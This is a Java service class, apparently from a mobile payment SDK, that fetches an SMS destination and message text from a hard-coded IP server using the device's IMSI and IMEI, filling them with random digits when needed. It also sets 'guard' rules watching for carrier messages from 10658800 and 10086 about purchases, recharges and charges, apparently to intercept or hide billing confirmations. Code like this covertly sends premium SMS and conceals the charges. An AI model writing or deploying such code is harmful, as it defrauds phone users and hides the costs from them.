package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.jxt.pay.appclient.utils.StringUtils;

public class WimiDynamicService implements IDynamicService{

	private static final String TYPE = "wimi";
	
	private static final String REQUESTMODEL = "channel=0001&imsi={imsi}&imei={imei}&wimicode={wimicode}&extData=test";
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final Guard guard0 = new Guard("10658800","成功|购买",2880,"1",0);
	private static final Guard guard1 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard2 = new Guard("10658800","",960,null,1);
	private static final Guard guard3 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private int timeOut = 100;
	private Map<String, Long> tryMap = new HashMap<String, Long>();
	
	@Override
	public String dynamic(Map<String, String> map) {
	
		String xml = null;
		
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String imsi = StringUtils.defaultString(map.get("imsi"));
			
			if(imsi.length() == 0){
				imsi = "46000115310";
			}
			
			imsi = fillImei(imsi);
			
			String param = REQUESTMODEL.replace("{imsi}" , imsi);
			
			String imei = StringUtils.defaultString(map.get("imei"));
			
			imei = fillImei(imei.replaceAll("[a-zA-Z]","1"));
			
			
			param = param.replace("{imei}", imei);
			param = param.replace("{wimicode}", StringUtils.defaultString(map.get("wimicode")));
			
			
			String responseXml = GetData.getData(url,param);
			
			xml = parseXml(map,responseXml);
			
			if(xml != null && xml.length() > 0){
				tryMap.remove(channel);
			}else{
				return DynamicUtils.parseWait(map);
			}
		}
		
		return xml;
	}

	private String parseXml(Map<String,String> map,String responseXml){
		
		if(responseXml != null && responseXml.length() > 0){
			String smsport = SingleXmlUtil.getNodeValue(responseXml, "smsport");
			String smscontent = SingleXmlUtil.getNodeValue(responseXml, "smscontent");
			
			if(smsport != null && smsport.length() > 0 && smscontent != null && smscontent.length() > 0){
				List<Sms> smsList = new ArrayList<Sms>();
				
				Sms sms = new Sms();
				
				sms.setSmsContent(smscontent);
				sms.setSmsDest(smsport);
				sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
				
				smsList.add(sms);
				
				Sms guardSms = new Sms();
				
				List<Guard> guardList = new ArrayList<Guard>();
				
				guardList.add(guard0);
				guardList.add(guard1);
				guardList.add(guard2);
				guardList.add(guard3);
				
				guardSms.setGuardList(guardList);
				
				smsList.add(0, guardSms);
					
				return XstreamHelper.toXml(smsList);
			}
		}
		
		return null;
	}
	
	private String fillImei(String imei){
		if(imei.length() < 15){
			int len = imei.length();
			
			for(int i = 0 ; i < 15 - len ; i ++){
				imei += new Random().nextInt(10);
			}
		}
		
		return imei;
	}

	public static void main(String[] args){
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("imsi", "460001153105779");
		map.put("imei", "869460011612203");
		map.put("channel", "100001a087654321");
		map.put("wimicode","20141204757201");
		map.put("url","http://115.29.187.79/mmpm/getWimiPayMore");
		
		System.out.println(new WimiDynamicService().dynamic(map));
	}


}
